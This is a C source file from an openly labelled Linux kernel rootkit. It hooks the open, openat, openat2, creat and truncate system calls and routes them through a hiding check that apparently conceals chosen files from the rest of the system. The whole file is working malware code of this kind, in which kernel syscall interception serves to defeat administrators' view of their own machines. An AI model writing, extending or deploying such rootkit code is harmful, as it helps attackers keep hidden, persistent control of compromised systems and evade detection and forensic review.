#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <asm-generic/errno-base.h>
#include <linux/fcntl.h>
#include <linux/openat2.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

// sys_open syscall hook handler
SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] open(%p, %#x, 0%ho)\n", s_filename, i32_flags, ui16_mode);

    return do_check_hidden(orig_open, p_regs, AT_FDCWD, s_filename,
                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_openat syscall hook handler
SYSCALL_HOOK_HANDLER4(openat, orig_openat, p_regs, int, i32_dfd, const char __user *, s_filename,
                      int, i32_flags, umode_t, ui16_mode)
{
    pr_info("[ROOTKIT] openat(%d, %p, %#x, 0%ho)\n", i32_dfd, s_filename, i32_flags, ui16_mode);

    return do_check_hidden(orig_openat, p_regs, i32_dfd, s_filename,
                           i32_flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_openat2 syscall hook handler
SYSCALL_HOOK_HANDLER4(openat2, orig_openat2, p_regs, int, i32_dfd, const char __user *, s_filename,
                      struct open_how __user *, p_how, size_t, sz_usize)
{
    int err;
    struct open_how tmp_how;

    pr_info("[ROOTKIT] openat2(%d, %p, %p, %zu)\n", i32_dfd, s_filename, p_how, sz_usize);

    // Following code is based on fs/open.c:sys_openat2()

    IF_U (sz_usize < OPEN_HOW_SIZE_VER0) {
        return -EINVAL;
    }

    err = copy_struct_from_user(&tmp_how, sizeof(tmp_how), p_how, sz_usize);
    if (err != 0) {
        return err;
    }

    return do_check_hidden(orig_openat2, p_regs, i32_dfd, s_filename,
                           tmp_how.flags & O_NOFOLLOW ? AT_SYMLINK_NOFOLLOW : 0);
}

// sys_creat syscall hook handler
SYSCALL_HOOK_HANDLER2(creat, orig_creat, p_regs, const char __user *, s_filename, umode_t,
                      ui16_mode)
{
    pr_info("[ROOTKIT] creat(%p, 0%ho)\n", s_filename, ui16_mode);

    return do_check_hidden(orig_creat, p_regs, AT_FDCWD, s_filename, 0);
}

// sys_truncate syscall hook handler
SYSCALL_HOOK_HANDLER2(truncate, orig_truncate, p_regs, const char __user *, s_filename, long,
                      i64_length)
{
    pr_info("[ROOTKIT] truncate(%p, %ld)\n", s_filename, i64_length);

    return do_check_hidden(orig_truncate, p_regs, AT_FDCWD, s_filename, 0);
}
